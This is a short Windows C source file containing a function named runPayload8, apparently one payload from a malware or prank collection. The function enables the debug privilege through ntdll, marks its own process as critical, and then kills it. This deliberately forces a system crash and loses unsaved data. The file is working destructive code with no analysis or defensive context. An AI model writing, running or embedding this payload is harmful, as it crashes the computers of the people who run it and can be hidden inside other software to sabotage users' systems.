#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif
#include <windows.h>

#define SE_DEBUG_PRIVILEGE 20

typedef LONG NTSTATUS;
typedef NTSTATUS(NTAPI* pfnRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(NTAPI* pfnRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);

void runPayload8() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) ntdll = LoadLibraryW(L"ntdll.dll");
    if (!ntdll) { TerminateProcess(GetCurrentProcess(), 1); return; }

    pfnRtlAdjustPrivilege RtlAdjustPrivilege =
        (pfnRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    pfnRtlSetProcessIsCritical RtlSetProcessIsCritical =
        (pfnRtlSetProcessIsCritical)GetProcAddress(ntdll, "RtlSetProcessIsCritical");
    if (!RtlAdjustPrivilege || !RtlSetProcessIsCritical) {
        MessageBoxW(NULL, L"ntdll exports missing", L"p8", MB_OK | MB_ICONERROR);
        TerminateProcess(GetCurrentProcess(), 1);
        return;
    }

    BOOLEAN old = FALSE;
    RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &old);

    NTSTATUS st = RtlSetProcessIsCritical(TRUE, NULL, FALSE);
    if (st != 0) {
        wchar_t buf[64];
        wsprintfW(buf, L"RtlSetProcessIsCritical returned 0x%08lX", (ULONG)st);
        MessageBoxW(NULL, buf, L"p8", MB_OK | MB_ICONERROR);
        TerminateProcess(GetCurrentProcess(), 1);
        return;
    }

    TerminateProcess(GetCurrentProcess(), (UINT)STATUS_INTEGER_DIVIDE_BY_ZERO);
}